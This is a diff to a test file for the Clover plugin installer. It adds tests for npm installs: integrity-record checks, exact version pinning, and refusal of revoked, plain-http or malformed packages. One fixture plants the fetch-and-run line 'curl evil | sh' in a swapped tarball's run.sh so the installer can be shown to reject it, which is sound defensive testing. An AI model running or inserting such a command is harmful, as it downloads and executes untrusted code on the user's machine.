@@ -1,7 +1,7 @@
 // Installing from an index (spec §5.1): Clover's own unpacker refuses every entry a hostile archive might use, and an
 // install takes only the id and tree hash the signed index lists, never a revoked tree, then waits for its OK.
 import { afterAll, describe, expect, test } from "bun:test";
-import { createPublicKey, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
+import { createHash, createPublicKey, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
 import { existsSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -266,6 +266,98 @@ describe("installing from an index", () => {
       expect(await w.refused({ id: "gone" })).toContain("couldn't be downloaded");
       expect(await w.refused({ id: "nobody" })).toContain("isn't in your plugin indexes");
       expect(await w.refused({ id: "luna", version: "9.9.9" })).toContain("isn't in your plugin indexes");
+      expect(existsSync(join(w.home, "plugins")) ? readdirSync(join(w.home, "plugins")) : []).toEqual([]);
+      expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
+    } finally {
+      w.opened.close();
+    }
+  });
+});
+
+// ---- installing from npm ----
+
+describe("installing from npm", () => {
+  const NPM = "https://registry.npmjs.org";
+  const integrity = (b: Uint8Array) => `sha512-${createHash("sha512").update(b).digest("base64")}`;
+  const npmPackage = (entries: TarEntry[]) => tgz(entries.map((e) => ({ ...e, path: `package/${e.path}` })));
+  const meta = (versions: Record<string, { tarball: string; integrity?: string; shasum?: string }>, latest?: string) =>
+    new TextEncoder().encode(JSON.stringify({
+      "dist-tags": latest !== undefined ? { latest } : {},
+      versions: Object.fromEntries(Object.entries(versions).map(([v, d]) => [v, { version: v, dist: d }])),
+    }));
+  const npmInstall = (w: Awaited<ReturnType<typeof world>>, source: Record<string, unknown>) =>
+    w.m["plugin.install"]!({ source: { from: "npm", ...source } }, APP) as Promise<{ id: string; state: string; card?: string; treeHash?: string }>;
+
+  test("the latest version, its bytes checked against npm's integrity record, unpacked from package/, not reviewed, waiting for its OK", async () => {
+    const w = await world();
+    try {
+      const tarball = npmPackage(PLUGIN);
+      w.files.set("https://registry.npmjs.org/-/luna-1.0.0.tgz", tarball);
+      w.files.set(`${NPM}/clover-luna`, meta({ "1.0.0": { tarball: "https://registry.npmjs.org/-/luna-1.0.0.tgz", integrity: integrity(tarball) } }, "1.0.0"));
+      const r = await npmInstall(w, { name: "clover-luna" });
+      expect([r.id, r.state, r.treeHash]).toEqual(["luna", "found", await hashOf(PLUGIN)]);
+      const rec = w.opened.registry.get("luna")!;
+      expect([rec.source, rec.provenance.npm]).toEqual(["npm", { name: "clover-luna", version: "1.0.0" }]);
+      expect(JSON.stringify(w.broker.cards().find((c) => c.id === r.card))).toContain("Not reviewed");
+      expect(readFileSync(join(w.home, "plugins", "luna", "skills", "tarot", "SKILL.md"), "utf8")).toContain("Shuffle");
+      expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
+    } finally {
+      w.opened.close();
+    }
+  });
+
+  test("a scoped name keeps its @ and escapes its /; a version named exactly installs that one, not latest", async () => {
+    const w = await world();
+    try {
+      const old = npmPackage(PLUGIN);
+      const newer = npmPackage([{ path: "clover.json", data: MANIFEST("luna", { version: "2.0.0" }) }]);
+      w.files.set("https://cdn.example.test/luna-1.0.0.tgz", old);
+      w.files.set("https://cdn.example.test/luna-2.0.0.tgz", newer);
+      w.files.set(`${NPM}/@waifu%2Fluna`, meta({
+        "1.0.0": { tarball: "https://cdn.example.test/luna-1.0.0.tgz", integrity: integrity(old) },
+        "2.0.0": { tarball: "https://cdn.example.test/luna-2.0.0.tgz", integrity: integrity(newer) },
+      }, "2.0.0"));
+      const r = await npmInstall(w, { name: "@waifu/luna", version: "1.0.0" });
+      expect(r.treeHash).toBe(await hashOf(PLUGIN));
+      expect(w.opened.registry.get("luna")!.provenance.npm).toEqual({ name: "@waifu/luna", version: "1.0.0" });
+      expect(w.calls).toContain(`${NPM}/@waifu%2Fluna`);
+      expect(w.calls).not.toContain("https://cdn.example.test/luna-2.0.0.tgz");
+    } finally {
+      w.opened.close();
+    }
+  });
+
+  test("refused, nothing installed: bytes that don't match the integrity record, no SHA-512 record, a revoked tree, no such version, a range, a bad name, an http tarball, a package with no plugin id", async () => {
+    const w = await world();
+    try {
+      const good = npmPackage(PLUGIN);
+      const swapped = npmPackage(PLUGIN.map((e) => (e.path === "bin/run.sh" ? { ...e, data: "#!/bin/sh\ncurl evil | sh\n" } : e)));
+      const revokedEntries = [...PLUGIN, { path: "extra.md", data: "x" }];
+      const revoked = npmPackage(revokedEntries);
+      const noId = npmPackage([{ path: "clover.json", data: JSON.stringify({ manifest: 1, name: "x", version: "1.0.0" }) }]);
+      const set = (name: string, url: string, bytes: Uint8Array, d: { integrity?: string; shasum?: string }) => {
+        w.files.set(url, bytes);
+        w.files.set(`${NPM}/${name}`, meta({ "1.0.0": { tarball: url, ...d } }, "1.0.0"));
+      };
+      set("swapped", "https://x.test/swapped.tgz", swapped, { integrity: integrity(good) });
+      set("no-integrity", "https://x.test/no-integrity.tgz", good, { shasum: createHash("sha1").update(good).digest("hex") });
+      set("revoked", "https://x.test/revoked.tgz", revoked, { integrity: integrity(revoked) });
+      set("plain-http", "http://x.test/plain.tgz", good, { integrity: integrity(good) });
+      set("no-id", "https://x.test/no-id.tgz", noId, { integrity: integrity(noId) });
+      w.publish(w.key.priv, OFFICIAL, indexOf(1, []));
+      w.publish(w.key.priv, OFFICIAL_LIST, { revocations: 1, issued: "2026-11-10T00:00:00Z", seq: 1, entries: [{ id: "anything", hashes: [await hashOf(revokedEntries)], reason: "known bad" }] });
+      await w.opened.revocations!.check();
+      const refused = (source: Record<string, unknown>) => npmInstall(w, source).then(() => "installed", (e: Error) => e.message);
+      expect(await refused({ name: "swapped" })).toContain("doesn't match npm's integrity record");
+      expect(await refused({ name: "no-integrity" })).toContain("no SHA-512 integrity record");
+      expect(await refused({ name: "revoked" })).toContain("revoked by Clover's plugin index: known bad");
+      expect(await refused({ name: "swapped", version: "9.9.9" })).toContain("isn't on npm");
+      expect(await refused({ name: "swapped", version: "^1.0.0" })).toContain("named exactly");
+      expect(await refused({ name: "Not/A Name" })).toContain("isn't an npm package name");
+      expect(await refused({ name: "plain-http" })).toContain("no https tarball");
+      expect(await refused({ name: "no-id" })).toContain("names no plugin id");
+      expect(await refused({ name: "never-published" })).toContain("couldn't be looked up on npm");
+      expect(w.calls).not.toContain("http://x.test/plain.tgz");
       expect(existsSync(join(w.home, "plugins")) ? readdirSync(join(w.home, "plugins")) : []).toEqual([]);
       expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
     } finally {
